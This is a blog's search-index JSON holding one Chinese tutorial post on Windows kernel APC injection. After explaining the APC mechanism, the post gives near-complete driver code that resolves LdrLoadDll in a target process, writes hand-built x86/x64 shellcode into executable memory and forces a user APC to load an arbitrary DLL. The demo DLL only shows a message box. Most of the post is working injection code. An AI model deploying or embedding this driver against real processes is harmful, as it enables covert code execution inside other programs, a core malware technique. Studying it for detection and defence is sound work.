{"meta":{"title":"qianmu's blog","subtitle":"","description":"","author":"qianmu","url":"https://qianmuoy.github.io","root":"/"},"pages":[{"title":"link","date":"2023-03-20T05:49:33.000Z","updated":"2023-03-20T05:50:00.871Z","comments":true,"path":"link/index.html","permalink":"https://qianmuoy.github.io/link/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-03-20T05:14:26.000Z","updated":"2023-03-20T05:16:34.634Z","comments":true,"path":"tags/index.html","permalink":"https://qianmuoy.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-03-20T05:14:50.000Z","updated":"2023-03-20T05:15:55.058Z","comments":true,"path":"categories/index.html","permalink":"https://qianmuoy.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"APC注入","slug":"APC注入","date":"2024-03-09T12:40:40.000Z","updated":"2024-03-09T12:40:55.406Z","comments":true,"path":"2024/03/09/APC注入/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/APC%E6%B3%A8%E5%85%A5/","excerpt":"","text":"APC注入APC机制线程是不能被杀死 挂起和恢复的，线程在执行的时候自己占据着CPU，别人怎么可能控制他呢？举个极端的例子，如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占据CPU。所以说线程如果想结束，一定是自己执行代码把自己杀死，不存在别人把线程结束的情况。 那如果想改变一个线程的行为该怎么办？可以给他提供一个函数，让他自己去调用，这个函数就是APC，即异步过程调用 对于内核APC，APC函数的插入和执行并不是同一个线程，具体点说：在A线程中向B线程插入一个APC，插入的动作是在A线程中完成的，但什么时候执行则由B线程决定。所以叫异步过程调用。 线程切换时，在SwapContext函数即将执行完成的时候，会判断当前是否有要执行的内核APC，接着将判断的结果存到eax，然后返回，接着找到上一层函数KiSwapContext函数，这个函数也没有对APC进行处理，而是继续返回，到父函数，会判断KiSwapContext的返回值，也就是判断当前是否有要处理的内核APC，如果有，则调用KiDeliverApc进行处理。 系统调用中断或者异常(_KiServiceExit)，会判断是否有要执行的用户APC，如果有的话则会调用KiDeliverApc函数进行处理，此时KiDeliverApc第一个参数为1，代表执行用户APC和内核APC。当要执行用户APC之前，先要执行内核APC。 对于应用APC，当产生系统调用、中断或者异常，线程在返回用户空间前都会调用_KiServiceExit函数，在_KiServiceExit函数里会判断是否有要执行的用户APC，如果有则调用KiDeliverApc函数进行处理。 有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到真正执行APC的位置每处理一个用户APC就会涉及到：内核—&gt;用户空间—&gt;再回到内核空间。进入内核前，当前上下文会被临时保存以待恢复。 APC注入dllmain注入的dll弹一个messageBox就行： 12345678910111213141516171819BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; MessageBox(NULL, L&quot;Inject&quot;, L&quot;Success&quot;, 0); break; &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; KAPC创建好设备对象和链接对象，设计派遣历程 12345678910111213141516171819202122232425262728293031323334353637383940NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegisterPath)&#123; UNREFERENCED_PARAMETER(RegisterPath); NTSTATUS Status = STATUS_SUCCESS; PDEVICE_OBJECT DeviceObject = NULL; UNICODE_STRING DeviceObjectName; UNICODE_STRING DeviceLinkName; ULONG i; DriverObject-&gt;DriverUnload = DriverUnload; //创建设备对象名称 RtlInitUnicodeString(&amp;DeviceObjectName, DEVICE_OBJECT_NAME); //创建设备对象 Status = IoCreateDevice(DriverObject, NULL, &amp;DeviceObjectName, FILE_DEVICE_UNKNOWN, 0, FALSE, &amp;DeviceObject); if (!NT_SUCCESS(Status)) &#123; return Status; &#125; //创建设备连接名称 RtlInitUnicodeString(&amp;DeviceLinkName, DEVICE_LINK_NAME); //将设备连接名称与设备名称关联 Status = IoCreateSymbolicLink(&amp;DeviceLinkName, &amp;DeviceObjectName); if (!NT_SUCCESS(Status)) &#123; IoDeleteDevice(DeviceObject); return Status; &#125; //设计符合我们代码的派遣历程 for (i = 0; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++) &#123; DriverObject-&gt;MajorFunction[i] = PassThroughDispatch; //函数指针 &#125; DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = ControlThroughDispatch;&#125; 派遣例程默认直接通过 1234567NTSTATUS PassThroughDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)&#123; Irp-&gt;IoStatus.Status = STATUS_SUCCESS; //LastError() Irp-&gt;IoStatus.Information = 0; //ReturnLength IoCompleteRequest(Irp, IO_NO_INCREMENT); //将Irp返回给Io管理器 return STATUS_SUCCESS;&#125; IRP_MJ_DEVICE_CONTROL自定义 解析IRP堆栈内容，筛选IO控制码，CTL_APC_INJECTION就调用注入函数 123456789101112131415161718192021222324252627282930313233343536373839NTSTATUS ControlThroughDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)&#123; NTSTATUS Status; ULONG_PTR Informaiton = 0; PVOID InputData = NULL; ULONG InputDataLength = 0; PVOID OutputData = NULL; ULONG OutputDataLength = 0; ULONG IoControlCode = 0; PEPROCESS EProcess = NULL; PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp); //Irp堆栈 IoControlCode = IoStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode; InputData = Irp-&gt;AssociatedIrp.SystemBuffer; OutputData = Irp-&gt;AssociatedIrp.SystemBuffer; InputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength; OutputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength; switch (IoControlCode) &#123; case CTL_APC_INJECTION: &#123; if (InputDataLength &gt;= sizeof(INJECTION_INFORMATION) &amp;&amp; InputData) Status = ApcInjectionPrepare((PINJECTION_INFORMATION)InputData); else &#123; Status = STATUS_INFO_LENGTH_MISMATCH; &#125; break; &#125; default: break; &#125; Irp-&gt;IoStatus.Status = Status; //Ring3 GetLastError(); Irp-&gt;IoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); //将Irp返回给Io管理器 return Status; //Ring3 DeviceIoControl()返回值&#125; APC注入主函数 PsLookupProcessByProcessId通过目标进程ID获取EProcess PsGetProcessWow64Process返回值可以判断是不是Wow64进程。 KeWaitForSingleObject返回值判断是否是僵尸进程。如果是，解引用释放。 KeStackAttachProcess切换进程上下背景文。 自己实现的SeGetModuleBaseByModuleName从目标进程获取Ntdll模块基地址。这里会使用到是否是Wow64进程 自己实现的SeGetExportFunctionFromModule从目标模块获取LdrLoadDll导出函数。 初始化ShellCode 调用自己的ApcInjection开始进行注入。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283NTSTATUS ApcInjectionPrepare(IN PINJECTION_INFORMATION InjectionInfo)&#123; NTSTATUS Status = STATUS_SUCCESS; NTSTATUS ThreadStatus = STATUS_SUCCESS; PEPROCESS EProcess = NULL; Status = PsLookupProcessByProcessId((HANDLE)InjectionInfo-&gt;TargetProcessID, &amp;EProcess); if (NT_SUCCESS(Status)) &#123; KAPC_STATE Apc; UNICODE_STRING DllFullPath,NtdllFullPath; //SET_PROCESS_PROTECTION Protection = &#123; 0 &#125;; PVOID NtdllModuleBase = NULL; PVOID LdrLoadDll = NULL; BOOLEAN IsWow64 = (PsGetProcessWow64Process(EProcess) != NULL) ? TRUE : FALSE; LARGE_INTEGER Timeout = &#123; 0 &#125;; // 进程处于信号状态，中止任何操作 if (KeWaitForSingleObject(EProcess, Executive, KernelMode, FALSE, &amp;Timeout) == STATUS_WAIT_0) &#123; DbgPrint(&quot;Process Is Terminating\\r\\n&quot;); if (EProcess) ObDereferenceObject(EProcess); return STATUS_PROCESS_IS_TERMINATING; &#125; KeStackAttachProcess(EProcess, &amp;Apc); //切换进程上下背景文 RtlInitUnicodeString(&amp;DllFullPath, InjectionInfo-&gt;DllFullPath); RtlInitUnicodeString(&amp;NtdllFullPath, L&quot;Ntdll.dll&quot;); NtdllModuleBase = SeGetModuleBaseByModuleName(EProcess, &amp;NtdllFullPath, IsWow64); //目标进程中获取Ntdll 信息 if (!NtdllModuleBase) &#123; DbgPrint(&quot;Failed To Get Ntdll Base\\r\\n&quot;); Status = STATUS_NOT_FOUND; &#125; // 获取LdrLoadDll地址 if (NT_SUCCESS(Status)) &#123; LdrLoadDll = SeGetExportFunctionFromModule(NtdllModuleBase, &quot;LdrLoadDll&quot;, EProcess, NULL); if (!LdrLoadDll) &#123; DbgPrint(&quot;Failed To Get LdrLoadDll Address\\r\\n&quot;); Status = STATUS_NOT_FOUND; &#125; &#125; // Call LdrLoadDll if (NT_SUCCESS(Status)) &#123; SIZE_T RegionSize = 0; PINJECTION_DATA InjectionData = IsWow64 ? GetWow64Code(LdrLoadDll, &amp;DllFullPath) : GetNativeCode(LdrLoadDll, &amp;DllFullPath); Status = ApcInjection(InjectionData, (HANDLE)InjectionInfo-&gt;TargetProcessID, NULL, NULL); if (NT_SUCCESS(Status)) &#123; if (InjectionInfo-&gt;IsUnlinkModule) &#123; &#125; ZwFreeVirtualMemory(ZwCurrentProcess(), &amp;InjectionData, &amp;RegionSize, MEM_RELEASE); &#125; &#125; KeUnstackDetachProcess(&amp;Apc); &#125; else &#123; DbgPrint(&quot;PsLookupProcessByProcessId() Error\\r\\n&quot;); &#125; if (EProcess) ObDereferenceObject(EProcess); return Status;&#125; 从目标进程通过模块名称获取模块基地址 检查EProcess 对WOW64和64位进程分别获取指定的PEB，并等待Loader初始化，然后再模块列表中搜索指定的模块名称，如果找到就返回基地址。注意WOW64需要转UNICODE 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889PVOID SeGetModuleBaseByModuleName(IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName, IN BOOLEAN IsWow64)&#123; if (EProcess == NULL) return NULL; __try &#123; LARGE_INTEGER Timeout = &#123; 0 &#125;; Timeout.QuadPart = -250ll * 10 * 1000; //250 msec. // Wow64 进程 if (IsWow64) &#123; PPEB32 Peb32 = (PPEB32)PsGetProcessWow64Process(EProcess); if (Peb32 == NULL) &#123; DbgPrint(&quot;PsGetProcessWow64Process() Error\\r\\n&quot;); return NULL; &#125; // 等待加载器 for (INT i = 0; !Peb32-&gt;Ldr &amp;&amp; i &lt; 10; i++) &#123; DbgPrint(&quot;Loader Not Intialiezd\\r\\n&quot;); KeDelayExecutionThread(KernelMode, TRUE, &amp;Timeout); &#125; // 没有加载 if (!Peb32-&gt;Ldr) &#123; DbgPrint(&quot;Loader Was Not Intialiezd In Time\\r\\n&quot;); return NULL; &#125; // 在InLoadOrderModuleList链表中查找 for (PLIST_ENTRY32 ListEntry = (PLIST_ENTRY32)((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink; ListEntry != &amp;((PPEB_LDR_DATA32)Peb32-&gt;Ldr)-&gt;InLoadOrderModuleList; ListEntry = (PLIST_ENTRY32)ListEntry-&gt;Flink) &#123; UNICODE_STRING v1; PLDR_DATA_TABLE_ENTRY32 LdrDataTableEntry32 = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY32, InLoadOrderLinks); RtlUnicodeStringInit(&amp;v1, (PWCH)LdrDataTableEntry32-&gt;BaseDllName.Buffer); if (RtlCompareUnicodeString(&amp;v1, ModuleName, TRUE) == 0) return (PVOID)LdrDataTableEntry32-&gt;DllBase; &#125; &#125; else &#123; PPEB64 Peb64 = PsGetProcessPeb(EProcess); if (!Peb64) &#123; DbgPrint(&quot;PsGetProcessPeb() Error\\r\\n&quot;); return NULL; &#125; // 等待加载器 for (INT i = 0; !Peb64-&gt;Ldr &amp;&amp; i &lt; 10; i++) &#123; DbgPrint(&quot;Loader Not Intialiezd\\r\\n&quot;); KeDelayExecutionThread(KernelMode, TRUE, &amp;Timeout); &#125; // 没有加载 if (!Peb64-&gt;Ldr) &#123; DbgPrint(&quot;Loader Was Not Intialiezd In Time\\r\\n&quot;); return NULL; &#125; // 在InLoadOrderModuleList链表中查找 for (PLIST_ENTRY64 ListEntry = (PLIST_ENTRY64)((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList.Flink; ListEntry != &amp;((PPEB_LDR_DATA64)Peb64-&gt;Ldr)-&gt;InLoadOrderModuleList; ListEntry = (PLIST_ENTRY64)ListEntry-&gt;Flink) &#123; PLDR_DATA_TABLE_ENTRY64 LdrDataTableEntry64 = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY64, InLoadOrderLinks); if (RtlCompareUnicodeString(&amp;LdrDataTableEntry64-&gt;BaseDllName, ModuleName, TRUE) == 0) return LdrDataTableEntry64-&gt;DllBase; &#125; &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; DbgPrint(&quot;Exception:Code: 0x%X\\n&quot;, GetExceptionCode()); &#125; return NULL;&#125; 从目标模块获取目标函数导出地址PE文件分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114PVOID SeGetExportFunctionFromModule(IN PVOID ModuleBase, IN PCCHAR FunctionName, IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName)&#123; PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase; PIMAGE_NT_HEADERS32 ImageNtHeader32 = NULL; PIMAGE_NT_HEADERS64 ImageNtHeader64 = NULL; PIMAGE_EXPORT_DIRECTORY ImageExportDirectory = NULL; ULONG ImageExportDirectoryLength = 0; ULONG_PTR FunctionAddress = 0; if (ModuleBase == NULL) return NULL; // 不是PE文件 if (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; ImageNtHeader32 = (PIMAGE_NT_HEADERS32)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew); ImageNtHeader64 = (PIMAGE_NT_HEADERS64)((PUCHAR)ModuleBase + ImageDosHeader-&gt;e_lfanew); // 不是PE文件 if (ImageNtHeader32-&gt;Signature != IMAGE_NT_SIGNATURE) return NULL; // 64位 if (ImageNtHeader32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123; ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase); ImageExportDirectoryLength = ImageNtHeader64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size; &#125; // 32位 else &#123; ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase); ImageExportDirectoryLength = ImageNtHeader32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size; &#125; PUSHORT AddressOfNameOrdinals = (PUSHORT)(ImageExportDirectory-&gt;AddressOfNameOrdinals + (ULONG_PTR)ModuleBase); PULONG AddressOfNames = (PULONG)(ImageExportDirectory-&gt;AddressOfNames + (ULONG_PTR)ModuleBase); PULONG AddressOfFunctions = (PULONG)(ImageExportDirectory-&gt;AddressOfFunctions + (ULONG_PTR)ModuleBase); for (ULONG i = 0; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; ++i) &#123; USHORT Index = 0xFFFF; PCHAR v1 = NULL; // 按索引查找 if ((ULONG_PTR)FunctionName &lt;= 0xFFFF) &#123; Index = (USHORT)i; &#125; // 按名字查找 else if ((ULONG_PTR)FunctionName &gt; 0xFFFF &amp;&amp; i &lt; ImageExportDirectory-&gt;NumberOfNames) &#123; v1 = (PCHAR)(AddressOfNames[i] + (ULONG_PTR)ModuleBase); Index = AddressOfNameOrdinals[i]; &#125; // 参数错误 else return NULL; if (((ULONG_PTR)FunctionName &lt;= 0xFFFF &amp;&amp; (USHORT)((ULONG_PTR)FunctionName) == Index + ImageExportDirectory-&gt;Base) || ((ULONG_PTR)FunctionName &gt; 0xFFFF &amp;&amp; strcmp(v1, FunctionName) == 0)) &#123; FunctionAddress = AddressOfFunctions[Index] + (ULONG_PTR)ModuleBase; // 检查是不是一个递归的导出 FuntionAddress = //Dll.Sub_4 if (FunctionAddress &gt;= (ULONG_PTR)ImageExportDirectory &amp;&amp; FunctionAddress &lt;= (ULONG_PTR)ImageExportDirectory + ImageExportDirectoryLength) &#123; WCHAR v1[256] = &#123; 0 &#125;; ANSI_STRING ForwarderString = &#123; 0 &#125;; ANSI_STRING ForwarderFunctionName = &#123; 0 &#125;; UNICODE_STRING ForwarderModuleName = &#123; 0 &#125;; //maxLength Length wchar* ULONG DelimIdx = 0; PVOID ForwardModuleBase = NULL; PVOID ForwardFunctionAddress = NULL; // 系统镜像不支持 if (EProcess == NULL) return NULL; RtlInitAnsiString(&amp;ForwarderString, (PCSZ)FunctionAddress); //FuntionAddress = //Dll.Sub_4........ RtlInitEmptyUnicodeString(&amp;ForwarderModuleName, v1, sizeof(v1)); RtlAnsiStringToUnicodeString(&amp;ForwarderModuleName, &amp;ForwarderString, FALSE); for (ULONG j = 0; j &lt; ForwarderModuleName.Length / sizeof(WCHAR); j++) &#123; if (ForwarderModuleName.Buffer[j] == L&#x27;.&#x27;) &#123; ForwarderModuleName.Length = (USHORT)(j * sizeof(WCHAR)); ForwarderModuleName.Buffer[j] = L&#x27;\\0&#x27;; DelimIdx = j; break; &#125; &#125; // 获取下一个模块的导出地址（递归的调用自己） RtlInitAnsiString(&amp;ForwarderFunctionName, ForwarderString.Buffer + DelimIdx + 1); RtlAppendUnicodeToString(&amp;ForwarderModuleName, L&quot;.dll&quot;); ForwardModuleBase = SeGetModuleBaseByModuleName(EProcess, &amp;ForwarderModuleName, PsGetProcessWow64Process(EProcess) != NULL); ForwardFunctionAddress = SeGetExportFunctionFromModule(ForwardModuleBase, ForwarderFunctionName.Buffer, EProcess, &amp;ForwarderModuleName); return ForwardFunctionAddress; &#125; break; &#125; &#125; return (PVOID)FunctionAddress;&#125; 获取ShellCodeWOW64 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455typedef struct _INJECTION_DATA&#123; UCHAR ShellCode[0x200]; union &#123; UNICODE_STRING DllFullPath; UNICODE_STRING32 DllFullPath32; &#125;; BOOLEAN IsUnlinkModule; // Unlink module after injection wchar_t BufferData[488]; //?? APC使用 PVOID ModuleBase; //?? ULONG CallComplete;&#125;INJECTION_DATA, *PINJECTION_DATA;PINJECTION_DATA GetWow64Code(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)&#123; NTSTATUS Status = STATUS_SUCCESS; PINJECTION_DATA RemoteBufferData = NULL; SIZE_T RemoteBufferLength = PAGE_SIZE; UCHAR ShellCode[] = &#123; 0x68, 0, 0, 0, 0, // push ModuleHandle offset +1 0x68, 0, 0, 0, 0, // push ModuleFileName offset +6 0x6A, 0, // push Flags 0x6A, 0, // push PathToFile 0xE8, 0, 0, 0, 0, // call LdrLoadDll offset +15 0xBA, 0, 0, 0, 0, // mov edx, COMPLETE_OFFSET offset +20 0xC7, 0x02, 0x7E, 0x1E, 0x37, 0xC0, // mov [edx], CALL_COMPLETE //给APC使用 0xC2, 0x04, 0x00 // ret 4 &#125;; Status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &amp;RemoteBufferData, 0, &amp;RemoteBufferLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (NT_SUCCESS(Status)) &#123; // 准备完整路径 PUNICODE_STRING32 v1 = &amp;RemoteBufferData-&gt;DllFullPath32; v1-&gt;Length = DllFullPath-&gt;Length; v1-&gt;MaximumLength = DllFullPath-&gt;MaximumLength; v1-&gt;Buffer = (ULONG)(ULONG_PTR)RemoteBufferData-&gt;BufferData; memcpy((PVOID)v1-&gt;Buffer, DllFullPath-&gt;Buffer, DllFullPath-&gt;Length); // 准备ShellCode memcpy(RemoteBufferData-&gt;ShellCode, ShellCode, sizeof(ShellCode)); // 填充结构所需要的参数 *(ULONG*)((PUCHAR)RemoteBufferData + 1) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;ModuleBase; *(ULONG*)((PUCHAR)RemoteBufferData + 6) = (ULONG)(ULONG_PTR)v1; *(ULONG*)((PUCHAR)RemoteBufferData + 15) = (ULONG)((ULONG_PTR)LdrLoadDll - ((ULONG_PTR)RemoteBufferData + 15) - 5 + 1); *(ULONG*)((PUCHAR)RemoteBufferData + 20) = (ULONG)(ULONG_PTR)&amp;RemoteBufferData-&gt;CallComplete; return RemoteBufferData; &#125; return NULL;&#125; x64 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647PINJECTION_DATA GetNativeCode(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)&#123; NTSTATUS Status = STATUS_SUCCESS; PINJECTION_DATA RemoteBufferData = NULL; SIZE_T RemoteBufferLength = PAGE_SIZE; // Code UCHAR ShellCode[] = &#123; 0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28 0x48, 0x31, 0xC9, // xor rcx, rcx 0x48, 0x31, 0xD2, // xor rdx, rdx 0x49, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov r8, ModuleFileName offset +12 0x49, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov r9, ModuleHandle offset +28 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, LdrLoadDll offset +32 0xFF, 0xD0, // call rax 0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, // mov rdx, COMPLETE_OFFSET offset +44 0xC7, 0x02, 0x7E, 0x1E, 0x37, 0xC0, // mov [rdx], CALL_COMPLETE //APC使用 0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28 0xC3 // ret &#125;; Status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &amp;RemoteBufferData, 0, &amp;RemoteBufferLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (NT_SUCCESS(Status)) &#123; // Copy path PUNICODE_STRING v1 = &amp;RemoteBufferData-&gt;DllFullPath; v1-&gt;Length = 0; v1-&gt;MaximumLength = sizeof(RemoteBufferData-&gt;BufferData); v1-&gt;Buffer = RemoteBufferData-&gt;BufferData; RtlUnicodeStringCopy(v1, DllFullPath); // Copy code memcpy(RemoteBufferData-&gt;ShellCode, ShellCode, sizeof(ShellCode)); // Fill stubs *(ULONGLONG*)((PUCHAR)RemoteBufferData + 12) = (ULONGLONG)v1; *(ULONGLONG*)((PUCHAR)RemoteBufferData + 22) = (ULONGLONG)&amp;RemoteBufferData-&gt;ModuleBase; *(ULONGLONG*)((PUCHAR)RemoteBufferData + 32) = (ULONGLONG)LdrLoadDll; *(ULONGLONG*)((PUCHAR)RemoteBufferData + 44) = (ULONGLONG)&amp;RemoteBufferData-&gt;CallComplete; return RemoteBufferData; &#125; return NULL;&#125; 开始APC注入 获取一个线程，取出EThread 插入线程的APC队列中 等待完成 123456789101112131415161718192021222324252627282930313233NTSTATUS ApcInjection(IN PINJECTION_DATA InjectionData, IN HANDLE TargetProcessID)&#123; //最后两个参数可以 NTSTATUS Status = STATUS_SUCCESS; PETHREAD EThread = NULL; // 获取活跃线程（主线程） Status = SeLookupProcessThread(TargetProcessID, &amp;EThread); if (NT_SUCCESS(Status)) &#123; // 插入APC队列 Status = SeQueueUserApc(EThread, InjectionData, NULL, NULL, NULL, TRUE); //内核情景分析 358 // 等待完成 if (NT_SUCCESS(Status)) //该代码待定 &#123; LARGE_INTEGER Interval = &#123; 0 &#125;; Interval.QuadPart = -(5LL * 10 * 1000); // 等待 for (ULONG i = 0; InjectionData-&gt;CallComplete != CALL_COMPLETE &amp;&amp; i &lt; 10000; i++) KeDelayExecutionThread(KernelMode, FALSE, &amp;Interval); &#125; &#125; else DbgPrint(&quot;Failed To Locate Thread\\r\\n&quot;); if (EThread) ObDereferenceObject(EThread); return Status;&#125; 获取活跃线程 获取进程的线程列表 过滤当前线程，并在SystemProcessInfo里取出一个线程ID获取EThread 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768NTSTATUS SeLookupProcessThread(IN HANDLE ProcessID, OUT PETHREAD* EThread)&#123; NTSTATUS Status = STATUS_SUCCESS; PVOID BufferData = ExAllocatePool(NonPagedPool, 1024 * 1024); PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)BufferData; if (EThread == NULL) return STATUS_INVALID_PARAMETER; if (!SystemProcessInfo) &#123; DbgPrint(&quot;Failed To Allocate Memory For Process List\\r\\n&quot;); return STATUS_NO_MEMORY; &#125; // 获取进程的线程列表 Status = ZwQuerySystemInformation(SystemProcessInformation, SystemProcessInfo, 1024 * 1024, NULL); if (!NT_SUCCESS(Status)) &#123; ExFreePool(BufferData); return Status; &#125; // 找到目标线程 if (NT_SUCCESS(Status)) &#123; Status = STATUS_NOT_FOUND; for (;;) &#123; if (SystemProcessInfo-&gt;UniqueProcessId == ProcessID) &#123; Status = STATUS_SUCCESS; break; &#125; else if (SystemProcessInfo-&gt;NextEntryOffset) SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemProcessInfo + SystemProcessInfo-&gt;NextEntryOffset); else break; &#125; &#125; if (NT_SUCCESS(Status)) &#123; Status = STATUS_NOT_FOUND; for (ULONG i = 0; i &lt; SystemProcessInfo-&gt;NumberOfThreads; i++) &#123; // 跳过当前线程 if ( SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread == PsGetCurrentThread()) &#123; continue; &#125; // 线程ID获取EThread Status = PsLookupThreadByThreadId(SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread, EThread); break; &#125; &#125; else DbgPrint(&quot;Failed To Locate Process\\r\\n&quot;); if (BufferData) ExFreePool(BufferData); return Status;&#125; 插入目标线程APC队列 分配APC内存 初始化APC并分配执行和结束回调例程。APC回调例程中可以设置强制唤醒。执行例程就是之前的ShellCode 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354NTSTATUS SeQueueUserApc(IN PETHREAD EThread,IN PVOID StartRoutine,IN PVOID Argument1,IN PVOID Argument2,IN PVOID Argument3, IN BOOLEAN IsForce)&#123; if (EThread == NULL) return STATUS_INVALID_PARAMETER; // 分配APC内存 PKAPC PrepareApc = NULL; PKAPC ExcuteApc = ExAllocatePool(NonPagedPool, sizeof(KAPC)); if (ExcuteApc == NULL) &#123; DbgPrint(&quot;Failed To Allocate APC\\r\\n&quot;); return STATUS_NO_MEMORY; &#125; // 一般APC 初始化 KeInitializeApc( ExcuteApc, (PKTHREAD)EThread, OriginalApcEnvironment, &amp;KernelApcExcuteCallback, NULL, (PKNORMAL_ROUTINE)(ULONG_PTR)StartRoutine, UserMode, Argument1); // 强制APC 初始化 if (IsForce) &#123; PrepareApc = ExAllocatePool(NonPagedPool, sizeof(KAPC)); KeInitializeApc( PrepareApc, (PKTHREAD)EThread, OriginalApcEnvironment, &amp;KernelApcPrepareCallback, NULL, NULL, KernelMode, NULL ); &#125; // 插入APC队列 if (KeInsertQueueApc(ExcuteApc, Argument2, Argument3, 0)) &#123; if (IsForce &amp;&amp; PrepareApc) KeInsertQueueApc(PrepareApc, NULL, NULL, 0); return STATUS_SUCCESS; &#125; else &#123; DbgPrint(&quot;Failed To Insert APC\\r\\n&quot;); ExFreePool(ExcuteApc); if (PrepareApc) ExFreePool(ExcuteApc); return STATUS_NOT_CAPABLE; &#125;&#125; APC完成回调例程一般情况 释放结构 12345678910111213141516171819202122VOID KernelApcExcuteCallback( PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2)&#123; UNREFERENCED_PARAMETER(SystemArgument1); UNREFERENCED_PARAMETER(SystemArgument2); // 当前线程正在被释放 if (PsIsThreadTerminating(PsGetCurrentThread())) *NormalRoutine = NULL; // 适配WOW64 if (PsGetCurrentProcessWow64Process() != NULL) PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine); // 释放APC结构 ExFreePool(Apc);&#125; 强制情况 强行唤醒线程执行APC，释放结构 1234567891011121314151617VOID KernelApcPrepareCallback( PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2)&#123; UNREFERENCED_PARAMETER(NormalRoutine); UNREFERENCED_PARAMETER(NormalContext); UNREFERENCED_PARAMETER(SystemArgument1); UNREFERENCED_PARAMETER(SystemArgument2); KeTestAlertThread(UserMode); //向目标植入可提醒状态 ExFreePool(Apc);&#125; 驱动卸载123456789101112131415VOID DriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNICODE_STRING DeviceLinkName; PDEVICE_OBJECT v1 = NULL; PDEVICE_OBJECT DeleteDeviceObject = NULL; RtlInitUnicodeString(&amp;DeviceLinkName, DEVICE_LINK_NAME); IoDeleteSymbolicLink(&amp;DeviceLinkName); DeleteDeviceObject = DriverObject-&gt;DeviceObject; while (DeleteDeviceObject != NULL) &#123; v1 = DeleteDeviceObject-&gt;NextDevice; IoDeleteDevice(DeleteDeviceObject); DeleteDeviceObject = v1; &#125;&#125; Ring3主函数外的入口 输入进程ID 获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径 通过链接名打开设备对象 初始化结构，发送结构体和控制码 